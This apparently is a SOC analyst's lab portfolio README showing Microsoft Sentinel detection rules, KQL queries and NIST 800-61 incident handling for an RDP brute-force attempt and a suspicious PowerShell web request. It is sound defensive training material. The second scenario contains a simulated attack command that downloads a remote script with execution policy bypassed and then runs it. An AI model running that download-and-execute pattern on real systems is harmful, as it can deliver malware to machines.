# 🛡️ Incident Detection & Response
**Microsoft Sentinel & Microsoft Defender for Endpoint (MDE)**

---

## 📌 Overview

This repository documents **hands-on Security Operations Center (SOC)** investigations conducted in a simulated Azure enterprise environment using **Microsoft Sentinel (SIEM)** and **Microsoft Defender for Endpoint (EDR/XDR)**.

The focus of this portfolio is **practical analyst work**, including:

- Log ingestion and correlation  
- Alert validation (True Positive vs False/Benign Positive)  
- Threat detection and investigation  
- Incident response following **NIST SP 800-61**  
- Writing investigation-ready documentation suitable for SOC escalation and reporting  

All scenarios reflect **real-world SOC alerting patterns**, not theoretical exercises.

---

## 🔐 Lab Architecture Overview

The following diagram illustrates the **end-to-end logging and detection pipeline** used across all scenarios in this repository.

<img width="2078" height="1162" alt="image" src="https://github.com/user-attachments/assets/ce26bbf9-b61f-4b1c-88c4-e46c9d6a04a5" />

### Architecture Summary

- Azure Virtual Machines generate endpoint and authentication events  
- Microsoft Defender for Endpoint (MDE) collects endpoint telemetry  
- Entra ID provides identity and sign-in logs  
- Azure Activity Logs capture management-plane operations  
- All logs are ingested into a **Log Analytics Workspace**  
- Microsoft Sentinel consumes the data for analytics, incidents, and investigations  

This architecture mirrors how Microsoft Sentinel is deployed in production environments.

---

## 📊 Log Sources & Tables Used

The diagram below shows how logs from multiple platforms flow into **Log Analytics** and are consumed by **Microsoft Sentinel**.

<img width="2013" height="916" alt="image" src="https://github.com/user-attachments/assets/0495c1df-b6da-4e25-b61e-34178ebcdcaa" />

### Primary Tables Used

#### Microsoft Defender for Endpoint (MDE)

- `DeviceLogonEvents` – Authentication attempts  
- `DeviceProcessEvents` – Process execution and command-line activity  
- `DeviceNetworkEvents` – Network connections  
- `DeviceFileEvents` – File creation, deletion, and modification  
- `DeviceInfo` – Endpoint metadata  

#### Entra ID (Azure AD)

- `SigninLogs` – User sign-in activity  
- `AuditLogs` – Identity changes and administrative actions  

#### Azure Management Plane

- `AzureActivity` – Resource creation, deletion, and modification  
- `AzureNetworkAnalytics_CL` – NSG and network flow logs (where applicable)  

This multi-source visibility enables **cross-domain correlation**, which is critical for SOC investigations.

---

## 🧭 Scenario Coverage Overview

The following diagram maps each incident scenario to its **log source and detection layer**.

<img width="2998" height="1630" alt="image" src="https://github.com/user-attachments/assets/331945b8-0a1c-4f0d-a5b3-53d5a1642e8c" />



### Scenario-to-Log Mapping

| Scenario | Detection Focus | Primary Log Source |
|--------|---------------|------------------|
| Scenario 1 | VM Brute Force Attack | `DeviceLogonEvents` |
| Scenario 2 | Suspicious PowerShell Web Requests | `DeviceProcessEvents` |
| Scenario 3 | Potential Impossible Travel | `SigninLogs` |
| Scenario 4 | Excessive Resource Creation or Deletion | `AzureActivity` |

---

## 🚨 Incident Response Scenarios
 
**NIST Special Publication 800-61 – Computer Security Incident Handling Guide**.

The NIST SP 800-61 framework provides a structured and repeatable approach for handling
security incidents and is widely adopted across enterprise SOCs.


### NIST SP 800-61 Incident Response Lifecycle
  <img width="1948" height="992" alt="image" src="https://github.com/user-attachments/assets/9231cf65-cdf6-4a7f-8a4e-14d72a03921b" />

---

# Scenario 1: Virtual Machine Brute Force Detection

## Incident Overview
This Scenario documents the investigation and response to a brute-force attack 
targeting a Windows virtual machine, detected using Microsoft Sentinel 
and Microsoft Defender for Endpoint.

## Part 1: Detection Rule Creation (Microsoft Sentinel)
The objective of this detection rule is to identify brute-force attack attempts 
against Azure virtual machines by detecting multiple failed authentication 
attempts originating from the same remote IP address within a short time window.

### Rule Configuration
- **Rule Type:** Scheduled Query Rule
- **Severity:** Medium
- **Data Source:** Microsoft Defender for Endpoint
- **Table Used:** DeviceLogonEvents
- **Threshold:** 10 or more failed logon attempts
- **Time Window:** Last 5 hours

Analytics Rule - General Settings

<img width="1344" height="1207" alt="image" src="https://github.com/user-attachments/assets/460fa6ba-e697-426e-ab98-d139a76a9aff" />

The detection rule was configured with a medium severity level, as the activity
indicates an active brute-force attempt without confirmed compromise.
MITRE ATT&CK mapping was applied to align the detection with credential access tactics.

### MITRE ATT&CK Mapping
The detection rule was mapped to the MITRE ATT&CK framework to align the alert
with known adversary techniques.

- **Tactic:** Credential Access
- **Technique:** Brute Force (T1110)


### Data Source
- **Data Source:** Microsoft Defender for Endpoint
- **Log Table:** DeviceLogonEvents

The DeviceLogonEvents table provides detailed authentication activity,
including successful, failed, and attempted logon events, making it suitable
for detecting credential-based attacks.


### KQL Query
The following KQL query was used to detect brute-force attempts:

```kql
DeviceLogonEvents
| where TimeGenerated > ago(5h)
| where ActionType == "LogonFailed"
| summarize FailedAttempts = count() by RemoteIP, DeviceName
| where FailedAttempts >= 10
| order by FailedAttempts desc
```

### Query Logic Explanation
- The query filters authentication events generated within the last 5 hours
  to focus on recent activity.
- Only failed logon attempts are included to exclude normal successful access.
- Events are aggregated by remote IP address and target device to identify
  repeated authentication failures.
- A threshold of 10 failed attempts is applied to reduce false positives
  caused by normal user mistakes.

#### View query results 
<img width="1588" height="1374" alt="image" src="https://github.com/user-attachments/assets/0e6e1115-8128-48fd-b0ed-7e962389fcdc" />

### Query Scheduling
- The analytics rule is scheduled to run every 5 hours.
- The lookback period is aligned with the query time window to ensure
  consistent detection coverage.
  
### Entity Mapping
Entity mapping was configured to enrich alerts and enable effective incident
investigation within Microsoft Sentinel.
- **IP Entity:** RemoteIP
- **Host Entity:** DeviceName
  
### Detection Logic Validation
The detection logic was validated by generating multiple failed login attempts
against the target virtual machine. Once the defined threshold was exceeded,
the analytics rule successfully triggered an alert and created an incident.



## Part 2: Trigger Alert to Create Incident
### Objective
Validate that the analytics rule successfully triggers and creates an incident
when the brute-force threshold is exceeded.

### What Happened
After generating multiple failed authentication attempts on the target virtual
machine, the analytics rule was executed and successfully triggered.
Microsoft Sentinel automatically created an incident based on the detected activity.

### Result
- An incident was created in Microsoft Sentinel.
- Severity: Medium
- Source: Scheduled Analytics Rule
- Entities identified: Remote IP address and affected virtual machine.

  <img width="2341" height="846" alt="image" src="https://github.com/user-attachments/assets/687d6813-b2f9-4b6e-be92-78e171523711" />


## Part 3: Work Incident (NIST 800-61)

### Preparation
- Document roles, responsibilities, and procedures.
- Ensure tools, systems, and training are in place.

### Detection and Analysis
A scheduled analytics rule in Microsoft Sentinel triggered an alert after
detecting multiple failed authentication attempts against a virtual machine.
The alert indicated a potential brute-force attack originating from multiple
external IP addresses.


The following query was used to identify IP addresses that generated a high
volume of failed authentication attempts against the target virtual machine.



```kql
DeviceLogonEvents
| where DeviceName == "lamavmonboardin"
| where ActionType == "LogonFailed" and TimeGenerated > ago(5h)
| summarize EventCount = count () by RemoteIP, DeviceName
| where EventCount >= 10
| order by EventCount
```



<img width="1078" height="287" alt="image" src="https://github.com/user-attachments/assets/0ddc0c84-9fd3-4f51-813b-ac01fdf32917" />



To determine whether the brute-force attempts resulted in a successful
compromise, a validation query was executed to check for successful logins
originating from the same IP addresses.


```kql
DeviceLogonEvents
| where DeviceName == "lamavmonboardin"
| where ActionType == "LogonSuccess"
| where RemoteIP in (
    "178.57.110.29",
    "194.180.49.142"
)
```

- The query returned no results, confirming that none of the identified IP
addresses successfully authenticated to the virtual machine. This indicates
that the brute-force attack was unsuccessful and no system compromise occurred.

<img width="654" height="248" alt="image" src="https://github.com/user-attachments/assets/eb407cf6-7013-475d-b51d-a6e96d0e2bba" />



### Containment, Eradication, and Recovery
After validating that the activity represented an active brute-force attempt,
immediate containment actions were taken to reduce exposure and prevent further
attempts. Public RDP access to the virtual machine was restricted by hardening
the Network Security Group (NSG), limiting access to trusted sources only.

No evidence of successful authentication or malware execution was identified.
As a precautionary measure, antivirus scanning was considered using Microsoft
Defender for Endpoint.

Since the attack was unsuccessful and no compromise occurred, no recovery or
system restoration actions were required, and the virtual machine continued
operating normally.

### Post-Incident Activities
Following the incident investigation, it was confirmed that the brute-force
attempt did not result in a successful compromise. Findings were documented,
and a recommendation was made to restrict public RDP access by enforcing
stricter Network Security Group (NSG) configurations for all virtual machines.


### Incident Closure

The incident was closed as a **True Positive – Suspicious Activity** Although
brute-force attempts were observed, investigation confirmed that no successful
authentication occurred and no system compromise was identified.

<img width="903" height="957" alt="image" src="https://github.com/user-attachments/assets/ea3fdc70-0991-4d43-a74c-b3431e1bf2d2" />



---
---


# Scenario 2: PowerShell Suspicious Web Request

## Incident Overview

<img width="2030" height="1157" alt="image" src="https://github.com/user-attachments/assets/3a2f0528-9d6c-4045-abb4-8581e08ecf55" />

The diagram illustrates a post-exploitation scenario where an attacker leverages PowerShell to download and execute a malicious script from the internet.

1. The attacker already has access to the endpoint.
2. PowerShell is used with the `Invoke-WebRequest` command to download a remote script (malware.ps1).
3. The script is saved locally on the system.
4. The script is executed using the `-File` parameter.
5. The malicious script may establish communication with a command-and-control (C2) server or perform data exfiltration.

This technique represents:
- Living-off-the-Land behavior
- Execution (MITRE ATT&CK)
- Potential Command and Control (C2)

### Environment
- Data Source: Microsoft Defender for Endpoint (DeviceProcessEvents)
- SIEM: Microsoft Sentinel (Log Analytics workspace)
- Entities: Account, Host, Process


## Part 1: Create Alert Rule (PowerShell Suspicious Web Request)
### Objective
Detect PowerShell usage of `Invoke-WebRequest` to download remote content and investigate the resulting incident in Microsoft Sentinel.

#### Analytics rule details
<img width="1371" height="1219" alt="image" src="https://github.com/user-attachments/assets/9521c773-1741-419f-bfc6-de782af06928" />



#### Mittre Attack: 
<img width="1247" height="468" alt="image" src="https://github.com/user-attachments/assets/00984eda-6682-475d-85f1-e8c45e44bc00" />


### Detection Query 
Design a Sentinel Scheduled Query Rule within Log Analytics that will discover when PowerShell is detected using Invoke-WebRequest to download content.

```kql
DeviceProcessEvents
| where DeviceName == "lamavmonboardin"
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "invoke-webrequest"
| project 
    TimeGenerated,
    DeviceName,
    AccountName,
    ProcessCommandLine,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine 
```



#### Entity Mapping Configuration
<img width="1261" height="726" alt="image" src="https://github.com/user-attachments/assets/ed99440e-9bcb-4d92-b29b-7e67de7c729a" />


## Part 2: Trigger Alert to Create Incident

#### Attack Simulation on VM
##### Executed Commands:

```
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';

powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
```

<img width="2413" height="646" alt="image" src="https://github.com/user-attachments/assets/c109c781-2104-4aa2-8a86-b3e02f20c13e" />


#### Log Verification in Sentinel

<img width="2182" height="684" alt="image" src="https://github.com/user-attachments/assets/49b20701-eb35-4a11-87cf-c080ccd57379" />


## Part 3: Work Incident

### Preparation

Incident assigned to SOC Analyst (Myself).
Followed NIST SP 800-61 Incident Response Lifecycle.
All findings documented inside Sentinel incident notes.

<img width="1195" height="1198" alt="image" src="https://github.com/user-attachments/assets/3e412fd4-285c-4ba4-8ab4-5034d6aae5ba" />

### Detection and Analysis
- The incident, labeled “PowerShell Suspicious Web Request”, was triggered on lamavmonboardin by a single user.
- During investigation, it was identified that multiple PowerShell commands were executed, resulting in the download and execution of one script.

#### PowerShell Commands Executed:
1.
``` powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../eicar.ps1 -OutFile C:\programdata\eicar.ps1 ```

2.
``` powershell.exe -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1 ```

##### Incident Details

- Device Affected: lamavmonboardin
- User Involved: lama
- Number of Scripts Downloaded: 1
- Event Trigger: Suspicious PowerShell web request detected by Sentinel analytics rule
During review, the user reported attempting to install free software at approximately the same time the events occurred.

#### Investigation and Findings 
Using Microsoft Defender for Endpoint, it was confirmed that the downloaded script was executed on the device.
The query confirmed:

<img width="2191" height="576" alt="image" src="https://github.com/user-attachments/assets/b524e8b3-8d5b-4de8-927b-36d0de8bf7dd" />

###### The query confirmed:
- Script execution occurred.
- Execution was performed by user account lama.
- Execution followed immediately after script download.
- No additional scripts were identified as executed.
  
### Containment, Eradication & Recovery
- The affected machine was isolated using Microsoft Defender for Endpoint.
- An anti-malware scan was conducted on the isolated machine.
- The scan returned clean results.
- Once confirmed safe, the machine was removed from isolation and restored to normal operations.

### Post-Incident Activities

### Closure

<img width="866" height="964" alt="image" src="https://github.com/user-attachments/assets/dee2d2e5-f084-4169-9141-2d85a6c0e0af" />
